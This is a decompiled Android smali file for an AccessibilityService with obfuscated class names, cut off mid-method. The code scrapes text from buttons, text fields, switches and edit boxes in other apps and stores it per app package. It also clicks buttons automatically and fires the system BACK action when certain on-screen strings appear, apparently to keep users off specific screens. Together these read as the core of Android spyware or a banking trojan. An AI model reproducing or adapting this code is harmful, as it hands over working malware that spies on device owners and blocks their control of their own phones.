.class public Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;
.super Landroid/accessibilityservice/AccessibilityService;


# static fields
.field public static a:Ljava/lang/String;

.field public static a:Z

.field static b:Ljava/lang/String;

.field public static b:Z

.field static c:Z

.field static d:Z

.field static e:Z


# instance fields
.field private a:I

.field private a:Ljava/util/Map;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private f:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    sput-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Z

    const-string v0, ""

    sput-object v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b:Ljava/lang/String;

    sput-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b:Z

    sput-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Z

    sput-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Z

    sput-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->e:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    iput-boolean v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->f:Z

    const-string v0, ""

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/util/Map;

    iput v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    const-string v0, ""

    iput-object v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    return-void
.end method

.method private static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Class;)Landroid/content/Intent;
    .locals 2

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p0, p4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v1, "name"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "type"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "link"

    invoke-virtual {v0, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    return-object v0
.end method

.method private static a(Z)Ljava/lang/Class;
    .locals 1

    if-eqz p0, :cond_0

    const-class v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/apgirdkzqzbmetqgxinvoluqnteskxtcflipdmurxfjgeyhhvwscyyvwlzkohfbujopaasmwnbjcdr;

    :goto_0
    return-object v0

    :cond_0
    const-class v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/hejngjiyycdwzmbbvgmzxalcnuxqeowopldmowhfsiktlkjzavpihxqfdykpqaungrbrtctuvfessr;

    goto :goto_0
.end method

.method private static a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    sparse-switch v0, :sswitch_data_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :sswitch_0
    const-string v0, "TYPE_NOTIFICATION_STATE_CHANGED"

    goto :goto_0

    :sswitch_1
    const-string v0, "TYPE_VIEW_CLICKED"

    goto :goto_0

    :sswitch_2
    const-string v0, "TYPE_VIEW_FOCUSED"

    goto :goto_0

    :sswitch_3
    const-string v0, "TYPE_VIEW_LONG_CLICKED"

    goto :goto_0

    :sswitch_4
    const-string v0, "TYPE_VIEW_SELECTED"

    goto :goto_0

    :sswitch_5
    const-string v0, "TYPE_WINDOW_STATE_CHANGED"

    goto :goto_0

    :sswitch_6
    const-string v0, "TYPE_VIEW_TEXT_CHANGED"

    goto :goto_0

    nop

    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_1
        0x2 -> :sswitch_3
        0x4 -> :sswitch_4
        0x8 -> :sswitch_2
        0x10 -> :sswitch_6
        0x20 -> :sswitch_5
        0x40 -> :sswitch_0
    .end sparse-switch
.end method

.method private a(I)V
    .locals 6

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v0, 0x1

    sput-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/pevuphdgxzoxibrophsewnqmdrgcaryazkoqztyduxjsjmqlmseatijywntkclnvbiwfcluhbkfvgf;->a:Z

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/x;

    int-to-long v2, p1

    int-to-long v4, p1

    invoke-direct {v0, v2, v3, v4, v5}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/x;-><init>(JJ)V

    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/x;->start()Landroid/os/CountDownTimer;

    return-void
.end method

.method private a(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    .locals 6
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    const v5, 0x7f080004

    const/high16 v4, 0x7f080000

    const/4 v3, 0x1

    if-nez p1, :cond_1

    :cond_0
    return-void

    :cond_1
    const v0, 0x7f080003

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v5}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_4

    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v5}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/I;->h:Ljava/lang/String;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_3

    const/16 v0, 0xbb8

    invoke-direct {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(I)V

    invoke-virtual {p0, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z

    :cond_3
    const/16 v0, 0x3e8

    invoke-direct {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(I)V

    invoke-virtual {p0, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z

    :cond_4
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p2, 0x1

    invoke-direct {p0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method private a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V
    .locals 3
    .annotation build Landroid/annotation/TargetApi;
        value = 0x12
    .end annotation

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v1, "android.widget.Button"

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    iget v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    if-ne v0, p3, :cond_2

    const/16 v0, 0x10

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    iget v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    :cond_3
    const/4 v0, 0x0

    :goto_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p2, 0x1

    invoke-direct {p0, v1, v2, p3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private a(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;IZ)V
    .locals 5
    .annotation build Landroid/annotation/TargetApi;
        value = 0x12
    .end annotation

    const/4 v0, 0x0

    if-eqz p1, :cond_5

    :try_start_0
    const-string v1, "launcher"

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_5

    const-string v1, "com.android"

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_5

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_5

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "null"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "null"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "null"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v2, ""

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    const/4 v1, -0x1

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    sparse-switch v4, :sswitch_data_0

    :cond_1
    :goto_0
    packed-switch v1, :pswitch_data_0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "["

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    :cond_2
    :goto_2
    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/util/Map;

    iget-object v2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, p2, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_3
    :goto_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_5

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p3, 0x1

    invoke-direct {p0, v1, p2, v2, p4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;IZ)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_3

    :sswitch_0
    const-string v4, "android.widget.Button"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    move v1, v0

    goto :goto_0

    :sswitch_1
    const-string v4, "android.widget.TextView"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v1, 0x1

    goto/16 :goto_0

    :sswitch_2
    const-string v4, "android.widget.CheckedTextView"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v1, 0x2

    goto/16 :goto_0

    :sswitch_3
    const-string v4, "android.widget.Switch"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v1, 0x3

    goto/16 :goto_0

    :sswitch_4
    const-string v4, "android.widget.EditText"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v1, 0x4

    goto/16 :goto_0

    :pswitch_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "[btn"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :pswitch_1
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "[text"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :pswitch_2
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "[radio"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

